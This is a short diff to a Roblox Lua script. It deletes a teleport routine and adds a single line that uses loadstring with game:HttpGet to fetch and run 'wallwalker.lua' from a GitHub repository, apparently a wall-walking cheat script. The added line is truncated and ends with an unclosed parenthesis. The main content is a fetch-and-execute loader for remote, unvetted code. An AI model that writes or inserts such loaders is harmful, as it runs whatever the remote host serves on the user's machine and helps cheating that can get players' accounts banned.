@@ -1,5 +1,1 @@
-local TeleportService = game:GetService("TeleportService")
-local player = game.Players.LocalPlayer
-local PLACE_ID = 8697486179
-TeleportService:Teleport(PLACE_ID, player)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))(
